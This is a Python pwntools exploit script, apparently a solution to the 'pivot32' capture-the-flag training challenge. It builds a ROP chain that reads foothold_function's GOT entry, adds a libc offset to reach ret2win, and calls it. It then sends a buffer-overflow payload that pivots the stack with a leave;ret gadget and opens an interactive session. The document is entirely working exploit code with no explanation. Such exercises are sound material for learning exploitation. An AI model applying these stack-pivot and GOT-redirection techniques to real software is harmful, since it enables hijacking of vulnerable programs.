#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['lxterminal', '-e']

local = 1
if local:
	p = process('./pivot32')
	elf = ELF('./pivot32')
	libc = ELF('./libpivot32.so')
else:
	p = remote()

foothold_plt = elf.plt['foothold_function']
foothold_got = elf.got['foothold_function']

gdb.attach(p)

p.recvuntil('pivot: ')
ptr = int(p.recv(10)[2:], 16)
info('ptr = ' + hex(ptr))

pop_eax_ret = 0x080488c0
call_eax = 0x080486a3
add_eax_ebx_ret = 0x080488c7
pop_ebx_ret = 0x08048571
mov_eax_peax_ret = 0x080488c4

offset = libc.symbols['ret2win'] - libc.symbols['foothold_function']

payload = p32(foothold_plt) + \
          p32(pop_eax_ret) + \
          p32(foothold_got) + \
          p32(mov_eax_peax_ret) + \
          p32(pop_ebx_ret) + \
          p32(offset) + \
          p32(add_eax_ebx_ret) + \
          p32(call_eax)

p.recvuntil('> ')
p.sendline(payload)

leave_ret = 0x080486a8

payload = cyclic(0x3A)
payload = 'A' * 40 + p32(ptr - 4) + p32(leave_ret) + p32(0xdeadbabe)

p.recvuntil('> ')
p.sendline(payload)

p.interactive()
